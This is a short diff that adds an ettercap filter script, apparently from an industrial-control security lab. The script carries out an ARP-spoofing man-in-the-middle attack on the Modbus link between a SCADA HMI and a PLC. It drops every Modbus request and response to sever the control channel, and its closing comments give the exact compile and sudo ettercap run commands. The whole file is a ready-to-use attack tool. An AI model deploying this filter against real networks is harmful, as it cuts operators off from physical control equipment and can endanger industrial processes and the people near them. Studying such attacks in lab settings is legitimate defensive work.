@@ -1,0 +1,31 @@
+#-----------------------------------------------------------------------------
+# Name:        arp_spoofing.filter
+#
+# Purpose:     This filter is used to do the arp spoofing attack on the Modbus 
+#              channel between SCADA-HMI and PLC01. It will drop all the 
+#              Modbus packets to cut off the PLC control channel.
+#
+# Author:      Yuancheng Liu
+#
+# Version:     v_0.1
+# Created:     2023/10/02
+# Copyright:   
+# License:     
+#-----------------------------------------------------------------------------
+
+if (ip.proto == TCP && tcp.dst == 502 && ip.dst == '10.107.105.5') {
+    # block the communication out from HMI to PLC
+    drop();
+    msg("Drop the HMI Modbus request!\n");
+}
+
+if (ip.proto == TCP && tcp.dst == 502 && ip.src == '10.107.107.5') {
+    # block the communication out from PLC to HMI
+    drop();
+    msg("Drop the PLC Modbus response!\n");
+}
+
+#-----------------------------------------------------------------------------
+# Filter Usage:
+# - compile : etterfilter arp_spoofing.filter -o atk.ef
+# - execute : sudo ettercap -T -q -F atk.ef -M ARP /10.107.107.4//
